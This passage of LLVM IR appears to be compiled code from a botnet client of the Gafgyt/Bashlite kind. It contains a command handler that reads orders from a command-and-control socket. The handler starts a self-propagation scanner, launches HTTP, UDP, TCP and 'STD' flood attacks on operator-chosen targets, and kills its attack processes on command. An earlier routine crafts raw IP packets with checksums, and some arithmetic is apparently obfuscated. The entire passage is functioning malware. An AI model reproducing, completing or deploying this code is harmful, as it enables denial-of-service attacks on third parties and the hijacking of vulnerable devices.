  %462 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %461, i32 0, i32 6
  store i16 %458, i16* %462, align 4
  %463 = bitcast i8* %86 to i16*
  %464 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 2
  %466 = load i16, i16* %465, align 2
  %467 = zext i16 %466 to i32
  %468 = call zeroext i16 @csum(i16* %463, i32 %467)
  %469 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 7
  store i16 %468, i16* %470, align 2
  %471 = load i32, i32* %25, align 4
  %472 = load i32, i32* %15, align 4
  %473 = icmp eq i32 %471, %472
  br i1 %473, label %474, label %480

; <label>:474:                                    ; preds = %428
  %475 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %476 = load i32, i32* %24, align 4
  %477 = icmp sgt i32 %475, %476
  br i1 %477, label %478, label %479

; <label>:478:                                    ; preds = %474
  br label %487

; <label>:479:                                    ; preds = %474
  store i32 0, i32* %25, align 4
  br label %427

; <label>:480:                                    ; preds = %428
  %481 = load i32, i32* %25, align 4
  %482 = sub i32 0, %481
  %483 = sub i32 0, 1
  %484 = add i32 %482, %483
  %485 = sub i32 0, %484
  %486 = add i32 %481, 1
  store i32 %485, i32* %25, align 4
  br label %427

; <label>:487:                                    ; preds = %478
  %488 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %488)
  br label %489

; <label>:489:                                    ; preds = %487, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %37, label %36

; <label>:36:                                     ; preds = %2
  br label %528

; <label>:37:                                     ; preds = %2
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.396, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %81, label %43

; <label>:43:                                     ; preds = %37
  %44 = load i8**, i8*** %4, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strcmp(i8* %46, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.397, i32 0, i32 0)) #10
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %56, label %49

; <label>:49:                                     ; preds = %43
  %50 = load i32, i32* @scanPid, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %49
  br label %528

; <label>:53:                                     ; preds = %49
  %54 = load i32, i32* @scanPid, align 4
  %55 = call i32 @kill(i32 %54, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  br label %56

; <label>:56:                                     ; preds = %53, %43
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @strcmp(i8* %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.398, i32 0, i32 0)) #10
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* @scanPid, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  br label %528

; <label>:66:                                     ; preds = %62
  %67 = call i32 @fork() #2
  store i32 %67, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %68 = load i32, i32* %5, align 4
  %69 = icmp ugt i32 %68, 0
  br i1 %69, label %70, label %72

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  br label %528

; <label>:72:                                     ; preds = %66
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %528

; <label>:76:                                     ; preds = %72
  br label %77

; <label>:77:                                     ; preds = %76
  %78 = load i32, i32* %7, align 4
  %79 = load i32, i32* %6, align 4
  call void @StartTheLelz(i32 %78, i32 %79)
  call void @_exit(i32 0) #12
  unreachable

; <label>:80:                                     ; preds = %56
  br label %81

; <label>:81:                                     ; preds = %80, %37
  %82 = load i8**, i8*** %4, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.399, i32 0, i32 0)) #10
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %146, label %87

; <label>:87:                                     ; preds = %81
  %88 = load i32, i32* %3, align 4
  %89 = icmp slt i32 %88, 6
  br i1 %89, label %102, label %90

; <label>:90:                                     ; preds = %87
  %91 = load i8**, i8*** %4, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 3
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @atoi(i8* %93) #10
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %102, label %96

; <label>:96:                                     ; preds = %90
  %97 = load i8**, i8*** %4, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 5
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @atoi(i8* %99) #10
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %102, label %103

; <label>:102:                                    ; preds = %96, %90, %87
  br label %528

; <label>:103:                                    ; preds = %96
  %104 = call i32 @listFork()
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %106, label %107

; <label>:106:                                    ; preds = %103
  br label %528

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* @HeliosCommSock, align 4
  %109 = load i8**, i8*** %4, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 1
  %111 = load i8*, i8** %110, align 8
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 2
  %114 = load i8*, i8** %113, align 8
  %115 = load i8**, i8*** %4, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 3
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 @atoi(i8* %117) #10
  %119 = load i8**, i8*** %4, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 5
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @atoi(i8* %121) #10
  %123 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %108, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.400, i32 0, i32 0), i8* %111, i8* %114, i32 %118, i32 %122)
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 1
  %126 = load i8*, i8** %125, align 8
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  %134 = trunc i32 %133 to i16
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 4
  %137 = load i8*, i8** %136, align 8
  %138 = load i8**, i8*** %4, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 5
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @atoi(i8* %140) #10
  %142 = load i8**, i8*** %4, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 6
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @atoi(i8* %144) #10
  call void @sendHTTP(i8* %126, i8* %129, i16 zeroext %134, i8* %137, i32 %141, i32 %145)
  call void @exit(i32 0) #14
  unreachable

; <label>:146:                                    ; preds = %81
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 0
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @strcmp(i8* %149, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.401, i32 0, i32 0)) #10
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %295, label %152

; <label>:152:                                    ; preds = %146
  %153 = load i32, i32* %3, align 4
  %154 = icmp slt i32 %153, 6
  br i1 %154, label %206, label %155

; <label>:155:                                    ; preds = %152
  %156 = load i8**, i8*** %4, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 3
  %158 = load i8*, i8** %157, align 8
  %159 = call i32 @atoi(i8* %158) #10
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %206, label %161

; <label>:161:                                    ; preds = %155
  %162 = load i8**, i8*** %4, align 8
  %163 = getelementptr inbounds i8*, i8** %162, i64 2
  %164 = load i8*, i8** %163, align 8
  %165 = call i32 @atoi(i8* %164) #10
  %166 = icmp eq i32 %165, -1
  br i1 %166, label %206, label %167

; <label>:167:                                    ; preds = %161
  %168 = load i8**, i8*** %4, align 8
  %169 = getelementptr inbounds i8*, i8** %168, i64 4
  %170 = load i8*, i8** %169, align 8
  %171 = call i32 @atoi(i8* %170) #10
  %172 = icmp eq i32 %171, -1
  br i1 %172, label %206, label %173

; <label>:173:                                    ; preds = %167
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 5
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @atoi(i8* %176) #10
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %206, label %179

; <label>:179:                                    ; preds = %173
  %180 = load i8**, i8*** %4, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 5
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #10
  %184 = icmp sgt i32 %183, 65536
  br i1 %184, label %206, label %185

; <label>:185:                                    ; preds = %179
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 5
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @atoi(i8* %188) #10
  %190 = icmp sgt i32 %189, 65500
  br i1 %190, label %206, label %191

; <label>:191:                                    ; preds = %185
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 4
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  %196 = icmp sgt i32 %195, 32
  br i1 %196, label %206, label %197

; <label>:197:                                    ; preds = %191
  %198 = load i32, i32* %3, align 4
  %199 = icmp eq i32 %198, 7
  br i1 %199, label %200, label %207

; <label>:200:                                    ; preds = %197
  %201 = load i8**, i8*** %4, align 8
  %202 = getelementptr inbounds i8*, i8** %201, i64 6
  %203 = load i8*, i8** %202, align 8
  %204 = call i32 @atoi(i8* %203) #10
  %205 = icmp slt i32 %204, 1
  br i1 %205, label %206, label %207

; <label>:206:                                    ; preds = %200, %191, %185, %179, %173, %167, %161, %155, %152
  br label %528

; <label>:207:                                    ; preds = %200, %197
  %208 = load i8**, i8*** %4, align 8
  %209 = getelementptr inbounds i8*, i8** %208, i64 1
  %210 = load i8*, i8** %209, align 8
  store i8* %210, i8** %8, align 8
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 2
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  store i32 %214, i32* %9, align 4
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 3
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  store i32 %218, i32* %10, align 4
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 4
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 @atoi(i8* %221) #10
  store i32 %222, i32* %11, align 4
  %223 = load i8**, i8*** %4, align 8
  %224 = getelementptr inbounds i8*, i8** %223, i64 5
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @atoi(i8* %225) #10
  store i32 %226, i32* %12, align 4
  %227 = load i32, i32* %3, align 4
  %228 = icmp sgt i32 %227, 6
  br i1 %228, label %229, label %234

; <label>:229:                                    ; preds = %207
  %230 = load i8**, i8*** %4, align 8
  %231 = getelementptr inbounds i8*, i8** %230, i64 6
  %232 = load i8*, i8** %231, align 8
  %233 = call i32 @atoi(i8* %232) #10
  br label %235

; <label>:234:                                    ; preds = %207
  br label %235

; <label>:235:                                    ; preds = %234, %229
  %236 = phi i32 [ %233, %229 ], [ 1000, %234 ]
  store i32 %236, i32* %13, align 4
  %237 = load i32, i32* %3, align 4
  %238 = icmp sgt i32 %237, 7
  br i1 %238, label %239, label %244

; <label>:239:                                    ; preds = %235
  %240 = load i8**, i8*** %4, align 8
  %241 = getelementptr inbounds i8*, i8** %240, i64 7
  %242 = load i8*, i8** %241, align 8
  %243 = call i32 @atoi(i8* %242) #10
  br label %245

; <label>:244:                                    ; preds = %235
  br label %245

; <label>:245:                                    ; preds = %244, %239
  %246 = phi i32 [ %243, %239 ], [ 1000000, %244 ]
  store i32 %246, i32* %14, align 4
  %247 = load i32, i32* %3, align 4
  %248 = icmp sgt i32 %247, 8
  br i1 %248, label %249, label %254

; <label>:249:                                    ; preds = %245
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 8
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #10
  br label %255

; <label>:254:                                    ; preds = %245
  br label %255

; <label>:255:                                    ; preds = %254, %249
  %256 = phi i32 [ %253, %249 ], [ 0, %254 ]
  store i32 %256, i32* %15, align 4
  %257 = load i8*, i8** %8, align 8
  %258 = call i8* @strstr(i8* %257, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %259 = icmp ne i8* %258, null
  br i1 %259, label %260, label %281

; <label>:260:                                    ; preds = %255
  %261 = load i8*, i8** %8, align 8
  %262 = call i8* @strtok(i8* %261, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %262, i8** %16, align 8
  br label %263

; <label>:263:                                    ; preds = %278, %260
  %264 = load i8*, i8** %16, align 8
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %280

; <label>:266:                                    ; preds = %263
  %267 = call i32 @listFork()
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %278, label %269

; <label>:269:                                    ; preds = %266
  %270 = load i8*, i8** %16, align 8
  %271 = load i32, i32* %9, align 4
  %272 = load i32, i32* %10, align 4
  %273 = load i32, i32* %11, align 4
  %274 = load i32, i32* %12, align 4
  %275 = load i32, i32* %13, align 4
  %276 = load i32, i32* %14, align 4
  %277 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %270, i32 %271, i32 %272, i32 %273, i32 %274, i32 %275, i32 %276, i32 %277)
  call void @_exit(i32 0) #12
  unreachable

; <label>:278:                                    ; preds = %266
  %279 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %279, i8** %16, align 8
  br label %263

; <label>:280:                                    ; preds = %263
  br label %294

; <label>:281:                                    ; preds = %255
  %282 = call i32 @listFork()
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %293, label %284

; <label>:284:                                    ; preds = %281
  %285 = load i8*, i8** %8, align 8
  %286 = load i32, i32* %9, align 4
  %287 = load i32, i32* %10, align 4
  %288 = load i32, i32* %11, align 4
  %289 = load i32, i32* %12, align 4
  %290 = load i32, i32* %13, align 4
  %291 = load i32, i32* %14, align 4
  %292 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %285, i32 %286, i32 %287, i32 %288, i32 %289, i32 %290, i32 %291, i32 %292)
  call void @_exit(i32 0) #12
  unreachable

; <label>:293:                                    ; preds = %281
  br label %294

; <label>:294:                                    ; preds = %293, %280
  br label %528

; <label>:295:                                    ; preds = %146
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 0
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.402, i32 0, i32 0)) #10
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %422, label %301

; <label>:301:                                    ; preds = %295
  %302 = load i32, i32* %3, align 4
  %303 = icmp slt i32 %302, 6
  br i1 %303, label %346, label %304

; <label>:304:                                    ; preds = %301
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 3
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #10
  %309 = icmp eq i32 %308, -1
  br i1 %309, label %346, label %310

; <label>:310:                                    ; preds = %304
  %311 = load i8**, i8*** %4, align 8
  %312 = getelementptr inbounds i8*, i8** %311, i64 2
  %313 = load i8*, i8** %312, align 8
  %314 = call i32 @atoi(i8* %313) #10
  %315 = icmp eq i32 %314, -1
  br i1 %315, label %346, label %316

; <label>:316:                                    ; preds = %310
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 4
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @atoi(i8* %319) #10
  %321 = icmp eq i32 %320, -1
  br i1 %321, label %346, label %322

; <label>:322:                                    ; preds = %316
  %323 = load i8**, i8*** %4, align 8
  %324 = getelementptr inbounds i8*, i8** %323, i64 4
  %325 = load i8*, i8** %324, align 8
  %326 = call i32 @atoi(i8* %325) #10
  %327 = icmp sgt i32 %326, 32
  br i1 %327, label %346, label %328

; <label>:328:                                    ; preds = %322
  %329 = load i32, i32* %3, align 4
  %330 = icmp sgt i32 %329, 6
  br i1 %330, label %331, label %337

; <label>:331:                                    ; preds = %328
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 6
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #10
  %336 = icmp slt i32 %335, 0
  br i1 %336, label %346, label %337

; <label>:337:                                    ; preds = %331, %328
  %338 = load i32, i32* %3, align 4
  %339 = icmp eq i32 %338, 8
  br i1 %339, label %340, label %347

; <label>:340:                                    ; preds = %337
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 7
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @atoi(i8* %343) #10
  %345 = icmp slt i32 %344, 1
  br i1 %345, label %346, label %347

; <label>:346:                                    ; preds = %340, %331, %322, %316, %310, %304, %301
  br label %528

; <label>:347:                                    ; preds = %340, %337
  %348 = load i8**, i8*** %4, align 8
  %349 = getelementptr inbounds i8*, i8** %348, i64 1
  %350 = load i8*, i8** %349, align 8
  store i8* %350, i8** %17, align 8
  %351 = load i8**, i8*** %4, align 8
  %352 = getelementptr inbounds i8*, i8** %351, i64 2
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 @atoi(i8* %353) #10
  store i32 %354, i32* %18, align 4
  %355 = load i8**, i8*** %4, align 8
  %356 = getelementptr inbounds i8*, i8** %355, i64 3
  %357 = load i8*, i8** %356, align 8
  %358 = call i32 @atoi(i8* %357) #10
  store i32 %358, i32* %19, align 4
  %359 = load i8**, i8*** %4, align 8
  %360 = getelementptr inbounds i8*, i8** %359, i64 4
  %361 = load i8*, i8** %360, align 8
  %362 = call i32 @atoi(i8* %361) #10
  store i32 %362, i32* %20, align 4
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 5
  %365 = load i8*, i8** %364, align 8
  store i8* %365, i8** %21, align 8
  %366 = load i32, i32* %3, align 4
  %367 = icmp eq i32 %366, 8
  br i1 %367, label %368, label %373

; <label>:368:                                    ; preds = %347
  %369 = load i8**, i8*** %4, align 8
  %370 = getelementptr inbounds i8*, i8** %369, i64 7
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @atoi(i8* %371) #10
  br label %374

; <label>:373:                                    ; preds = %347
  br label %374

; <label>:374:                                    ; preds = %373, %368
  %375 = phi i32 [ %372, %368 ], [ 10, %373 ]
  store i32 %375, i32* %22, align 4
  %376 = load i32, i32* %3, align 4
  %377 = icmp sgt i32 %376, 6
  br i1 %377, label %378, label %383

; <label>:378:                                    ; preds = %374
  %379 = load i8**, i8*** %4, align 8
  %380 = getelementptr inbounds i8*, i8** %379, i64 6
  %381 = load i8*, i8** %380, align 8
  %382 = call i32 @atoi(i8* %381) #10
  br label %384

; <label>:383:                                    ; preds = %374
  br label %384

; <label>:384:                                    ; preds = %383, %378
  %385 = phi i32 [ %382, %378 ], [ 0, %383 ]
  store i32 %385, i32* %23, align 4
  %386 = load i8*, i8** %17, align 8
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %388 = icmp ne i8* %387, null
  br i1 %388, label %389, label %409

; <label>:389:                                    ; preds = %384
  %390 = load i8*, i8** %17, align 8
  %391 = call i8* @strtok(i8* %390, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %391, i8** %24, align 8
  br label %392

; <label>:392:                                    ; preds = %406, %389
  %393 = load i8*, i8** %24, align 8
  %394 = icmp ne i8* %393, null
  br i1 %394, label %395, label %408

; <label>:395:                                    ; preds = %392
  %396 = call i32 @listFork()
  %397 = icmp ne i32 %396, 0
  br i1 %397, label %406, label %398

; <label>:398:                                    ; preds = %395
  %399 = load i8*, i8** %24, align 8
  %400 = load i32, i32* %18, align 4
  %401 = load i32, i32* %19, align 4
  %402 = load i32, i32* %20, align 4
  %403 = load i8*, i8** %21, align 8
  %404 = load i32, i32* %23, align 4
  %405 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %399, i32 %400, i32 %401, i32 %402, i8* %403, i32 %404, i32 %405)
  call void @_exit(i32 0) #12
  unreachable

; <label>:406:                                    ; preds = %395
  %407 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %407, i8** %24, align 8
  br label %392

; <label>:408:                                    ; preds = %392
  br label %421

; <label>:409:                                    ; preds = %384
  %410 = call i32 @listFork()
  %411 = icmp ne i32 %410, 0
  br i1 %411, label %420, label %412

; <label>:412:                                    ; preds = %409
  %413 = load i8*, i8** %17, align 8
  %414 = load i32, i32* %18, align 4
  %415 = load i32, i32* %19, align 4
  %416 = load i32, i32* %20, align 4
  %417 = load i8*, i8** %21, align 8
  %418 = load i32, i32* %23, align 4
  %419 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %413, i32 %414, i32 %415, i32 %416, i8* %417, i32 %418, i32 %419)
  call void @_exit(i32 0) #12
  unreachable

; <label>:420:                                    ; preds = %409
  br label %421

; <label>:421:                                    ; preds = %420, %408
  br label %422

; <label>:422:                                    ; preds = %421, %295
  %423 = load i8**, i8*** %4, align 8
  %424 = getelementptr inbounds i8*, i8** %423, i64 0
  %425 = load i8*, i8** %424, align 8
  %426 = call i32 @strcmp(i8* %425, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.403, i32 0, i32 0)) #10
  %427 = icmp ne i32 %426, 0
  br i1 %427, label %484, label %428

; <label>:428:                                    ; preds = %422
  %429 = load i32, i32* %3, align 4
  %430 = icmp slt i32 %429, 4
  br i1 %430, label %443, label %431

; <label>:431:                                    ; preds = %428
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 2
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #10
  %436 = icmp slt i32 %435, 1
  br i1 %436, label %443, label %437

; <label>:437:                                    ; preds = %431
  %438 = load i8**, i8*** %4, align 8
  %439 = getelementptr inbounds i8*, i8** %438, i64 3
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @atoi(i8* %440) #10
  %442 = icmp slt i32 %441, 1
  br i1 %442, label %443, label %444

; <label>:443:                                    ; preds = %437, %431, %428
  br label %528

; <label>:444:                                    ; preds = %437
  %445 = load i8**, i8*** %4, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 1
  %447 = load i8*, i8** %446, align 8
  store i8* %447, i8** %25, align 8
  %448 = load i8**, i8*** %4, align 8
  %449 = getelementptr inbounds i8*, i8** %448, i64 2
  %450 = load i8*, i8** %449, align 8
  %451 = call i32 @atoi(i8* %450) #10
  store i32 %451, i32* %26, align 4
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 3
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #10
  store i32 %455, i32* %27, align 4
  %456 = load i8*, i8** %25, align 8
  %457 = call i8* @strstr(i8* %456, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %458 = icmp ne i8* %457, null
  br i1 %458, label %459, label %475

; <label>:459:                                    ; preds = %444
  %460 = load i8*, i8** %25, align 8
  %461 = call i8* @strtok(i8* %460, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %461, i8** %28, align 8
  br label %462

; <label>:462:                                    ; preds = %472, %459
  %463 = load i8*, i8** %28, align 8
  %464 = icmp ne i8* %463, null
  br i1 %464, label %465, label %474

; <label>:465:                                    ; preds = %462
  %466 = call i32 @listFork()
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %472, label %468

; <label>:468:                                    ; preds = %465
  %469 = load i8*, i8** %28, align 8
  %470 = load i32, i32* %26, align 4
  %471 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %469, i32 %470, i32 %471)
  call void @_exit(i32 0) #12
  unreachable

; <label>:472:                                    ; preds = %465
  %473 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %473, i8** %28, align 8
  br label %462

; <label>:474:                                    ; preds = %462
  br label %483

; <label>:475:                                    ; preds = %444
  %476 = call i32 @listFork()
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %478, label %479

; <label>:478:                                    ; preds = %475
  br label %528

; <label>:479:                                    ; preds = %475
  %480 = load i8*, i8** %25, align 8
  %481 = load i32, i32* %26, align 4
  %482 = load i32, i32* %27, align 4
  call void @sendSTD(i8* %480, i32 %481, i32 %482)
  call void @_exit(i32 0) #12
  unreachable

; <label>:483:                                    ; preds = %474
  br label %484

; <label>:484:                                    ; preds = %483, %422
  %485 = load i8**, i8*** %4, align 8
  %486 = getelementptr inbounds i8*, i8** %485, i64 0
  %487 = load i8*, i8** %486, align 8
  %488 = call i32 @strcmp(i8* %487, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.404, i32 0, i32 0)) #10
  %489 = icmp ne i32 %488, 0
  br i1 %489, label %528, label %490

; <label>:490:                                    ; preds = %484
  store i32 0, i32* %29, align 4
  store i64 0, i64* %30, align 8
  br label %491

; <label>:491:                                    ; preds = %521, %490
  %492 = load i64, i64* %30, align 8
  %493 = load i64, i64* @numpids, align 8
  %494 = icmp ult i64 %492, %493
  br i1 %494, label %495, label %527

; <label>:495:                                    ; preds = %491
  %496 = load i32*, i32** @pids, align 8
  %497 = load i64, i64* %30, align 8
  %498 = getelementptr inbounds i32, i32* %496, i64 %497
  %499 = load i32, i32* %498, align 4
  %500 = icmp ne i32 %499, 0
  br i1 %500, label %501, label %520

; <label>:501:                                    ; preds = %495
  %502 = load i32*, i32** @pids, align 8
  %503 = load i64, i64* %30, align 8
  %504 = getelementptr inbounds i32, i32* %502, i64 %503
  %505 = load i32, i32* %504, align 4
  %506 = call i32 @getpid() #2
  %507 = icmp ne i32 %505, %506
  br i1 %507, label %508, label %520

; <label>:508:                                    ; preds = %501
  %509 = load i32*, i32** @pids, align 8
  %510 = load i64, i64* %30, align 8
  %511 = getelementptr inbounds i32, i32* %509, i64 %510
  %512 = load i32, i32* %511, align 4
  %513 = call i32 @kill(i32 %512, i32 9) #2
  %514 = load i32, i32* %29, align 4
  %515 = sub i32 0, %514
  %516 = sub i32 0, 1
  %517 = add i32 %515, %516
  %518 = sub i32 0, %517
  %519 = add nsw i32 %514, 1
  store i32 %518, i32* %29, align 4
  br label %520

; <label>:520:                                    ; preds = %508, %501, %495
  br label %521

; <label>:521:                                    ; preds = %520
  %522 = load i64, i64* %30, align 8
